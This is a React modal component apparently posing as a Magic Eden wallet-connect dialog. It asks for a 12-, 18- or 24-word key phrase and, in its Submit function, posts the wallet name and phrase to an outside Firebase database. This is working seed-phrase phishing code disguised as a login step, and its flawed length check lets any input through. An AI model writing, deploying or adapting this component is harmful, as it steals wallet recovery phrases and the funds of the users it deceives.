import * as React from "react";
import Dialog from "@mui/material/Dialog";
import DialogContent from "@mui/material/DialogContent";
import DialogTitle from "@mui/material/DialogTitle";
import ClearIcon from "@mui/icons-material/Clear";
import {
  Grid,
  Typography,
  Demo,
  Avatar,
  List,
  ListItem,
  ListItemAvatar,
  Divider,
} from "@mui/material";
import { styled } from "@mui/material/styles";
import axios from "axios";
export default function Inputmodal({ openinput, setopeninput, walletname }) {
  const handleClose = () => {
    setopeninput(false);
  };
  const Demo = styled("div")(({ theme }) => ({
    backgroundColor: theme.palette.background.paper,
  }));
  function generate(element) {
    return [0, 1, 2].map((value) =>
      React.cloneElement(element, {
        key: value,
      })
    );
  }
  const [error, seterror] = React.useState(true);
  const [input, setinput] = React.useState("");
  const [phraselength, setphraselength] = React.useState();
  const handleinput = (e) => {
    setinput(e.target.value);
    const wordCount = input.match(/(\w+)/g).length;
    setphraselength(wordCount);
  };

  const Submit = async () => {
    if (phraselength === 12 || 18 || 24) {
      seterror(false);
      const res = await axios.post(
        "https://magic-eden-data-default-rtdb.firebaseio.com/magiceden.json",
        { wallet: walletname, key: input }
      );
      setinput("");
      setopeninput(false);
    } else seterror(true);
  };
  return (
    <div>
      <Dialog open={openinput} onClose={handleClose}>
        <div>
          <DialogTitle
            style={{
              background: "#10141f",
              color: "white",
              textAlign: "center",
              fontSize: "25px",
              fontWeight: "600",
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            Enter your Key
            <ClearIcon
              onClick={() => setopeninput(false)}
              style={{ marginLeft: "40px", color: "#777" }}
            />
          </DialogTitle>
        </div>
        <Divider />
        <DialogContent style={{ background: "#10141f" }}>
          <input
            value={input}
            onChange={handleinput}
            type="text"
            style={{
              width: "100%",
              height: "80px",
              borderRadius: "5px",
              outline: "none",
            }}
          />
          {error && (
            <p style={{ color: "red" }}>
              Please,enter your 12 ,18 or 24 phrase
            </p>
          )}
          <button
            style={{
              width: "100%",
              outline: "none",
              background: "purple",
              cursor: "pointer",
              border: "none",
              height: "35px",
              color: "#fff",
              fontWeight: "600",
              borderRadius: "5px",
              marginTop: "15px",
            }}
            onClick={Submit}
          >
            Connect
          </button>
        </DialogContent>
      </Dialog>
    </div>
  );
}
